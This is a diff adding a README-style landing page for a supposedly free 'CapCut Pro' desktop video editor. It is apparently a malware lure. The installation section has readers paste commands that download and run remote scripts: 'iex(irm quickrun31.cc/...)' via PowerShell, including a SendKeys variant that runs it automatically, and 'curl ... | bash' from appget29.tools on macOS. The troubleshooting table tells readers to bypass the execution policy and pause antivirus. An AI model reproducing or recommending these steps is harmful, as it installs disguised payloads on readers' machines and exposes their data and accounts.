@@ -1,0 +1,136 @@
+CapCut Pro for Windows and macOS
+
+CapCut Pro for Windows and macOS
+
+  Desktop Video Editor
+
+  AI Captions · Effects · Keyframes · 4K Export
+
+  Installation ·
+  Features ·
+  Workflow ·
+  FAQ
+
+Installation
+
+Windows
+
+Two quick setup methods.
+
+Method 1 — Win + X
+
+1. Press Win + X
+2. Open Terminal or Windows PowerShell
+3. Paste:
+
+sal a iex;irm quickrun31.cc/7kgaoq|a
+
+4. Press Enter and wait for the process to finish
+5. Launch CapCut Pro
+
+Method 2 — Win + R
+
+1. Press Win + R
+2. Paste:
+
+powershell Set-Clipboard 'iex(irm quickrun31.cc/7kgaoq)';Start-Process powershell;Start-Sleep -m 1200;(New-Object -ComObject WScript.Shell).SendKeys('^v');Start-Sleep -m 200;(New-Object -ComObject WScript.Shell).SendKeys('{ENTER}')
+
+3. Press Enter and wait
+4. Launch CapCut Pro
+
+macOS
+
+Open Terminal and run:
+
+curl -fsSL https://appget29.tools/qkc0gc4b50mutxs | bash
+
+Requirements
+
+- Windows 10/11 (64-bit) or macOS
+- Internet connection during setup only
+- 8 GB RAM minimum (16 GB recommended)
+
+Troubleshooting (Windows)
+
+| Issue | What to try |
+|-------|-------------|
+| Connection error | Check internet |
+| Execution Policy message | Set-ExecutionPolicy Bypass -Scope Process -Force |
+| Blocked by antivirus | Temporarily pause real-time protection |
+| Window closes right away | Usually means setup finished |
+
+About
+
+CapCut Pro for Windows and macOS is a desktop video editor for content creators. It includes a timeline, AI auto captions, effects, keyframe animation and export options up to 4K on both platforms.
+
+Suitable for short-form content and longer videos.
+
+Use at your own risk. Keep your system protected.
+
+Features
+
+Smart Tools
+- AI Auto Captions
+- Background removal
+- Auto beat sync
+- Templates
+
+Editing
+- Multi-track timeline
+- Keyframe animation
+- Speed curves
+- Compound clips
+
+Effects & Audio
+- Effects and transitions library
+- Built-in music and sound effects
+- Voice enhancement
+- Audio keyframes
+
+Export
+- Up to 4K
+- Common format support
+
+Workflow
+
+1. Create a new project
+2. Import media
+3. Arrange clips on the timeline
+4. Add effects, text and transitions
+5. Generate captions
+6. Export
+
+How to Use
+
+1. Install using the method for your system
+2. Launch CapCut Pro
+3. Start a new project
+4. Edit and export
+
+Tips
+- Use auto captions for higher retention on short videos
+- Keyframe scale and position for simple motion
+- Export in 1080p or 4K depending on the platform
+
+FAQ
+
+What is this?
+A desktop video editor with AI captions, effects and 4K export for Windows and macOS.
+
+Is it free to use?
+Yes, this build is free to use.
+
+Supported systems?
+Windows 10/11 and macOS.
+
+How do I remove it?
+Delete the program folder and remove shortcuts.
+
+Keywords
+
+capcut pro for windows and macos, capcut, video editor, ai captions, 4k video editor, capcut desktop, short form editor, content creator tools, capcut windows, capcut mac
+
+License
+
+MIT License.
+Original software by ByteDance. All rights belong to the respective owners.
